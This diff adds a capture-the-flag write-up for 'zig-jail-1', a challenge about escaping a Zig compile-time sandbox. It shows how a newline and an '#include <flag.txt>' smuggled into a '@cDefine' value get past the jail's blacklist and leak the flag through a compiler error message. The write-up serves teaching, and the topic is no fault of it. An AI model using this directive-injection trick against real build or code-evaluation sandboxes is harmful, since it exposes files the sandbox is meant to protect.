@@ -1,0 +1,62 @@
+import { ChallengeInfo } from "../../../../components/ChallengeInfo.js"
+
+# zig-jail-1
+
+<ChallengeInfo items={{
+    category: "jail",
+    points: 485,
+    solves: 4,
+    difficulty: "medium",
+}}>
+This isn't c anymore you can't just #include the flag right?
+
+`nc chal.amt.rs 1515`
+</ChallengeInfo>
+
+`zig-jail-1` was inspired by the classic challenge where you use `#include "flag.txt"` in order to leak the flag.
+
+There are three possible ways to read external files in comptime:
+
+### `@embedFile`
+`@embedFile` reads an external file and returns the contents as a byte array.
+```zig open
+const flag = @embedFile("flag.txt");
+@compileLog(flag);
+```
+
+### `@import`
+`@import` can read external files, but with a restriction that it can only target files that end with a `.zig` file extension. Since the flag is located in `flag.txt`, `@import` is not able to actually read the flag.
+
+### `@cImport` and `@cInclude`
+These two macros can be used to achieve the same effect as `#include "flag.txt"` in normal C.
+```zig open
+@cImport({
+    @cInlude("flag.txt");
+});
+```
+
+However all of these methods are explicitly blacklisted by the jail, because that would be too easy wouldn't it :D.
+
+## solution
+
+Apart from `@cInclude` there is also `@cDefine` and `@cUndef` which provide `#define` and `#undef` from zig.
+```zig open
+@cImport({
+    @cDefine("DEBUG", "1");
+});
+```
+
+Turns out that they simply take the strings and paste it directly into a temporary buffer, and allows funny things like:
+```zig open
+@cImport({
+    @cDefine("HM", "1\n#include <flag.txt>");
+});
+```
+
+which would generate the equivalent c of:
+```c open
+#define HM 1
+#include <flag.txt>
+```
+
+and is enough to leak the flag on remote through the error message.
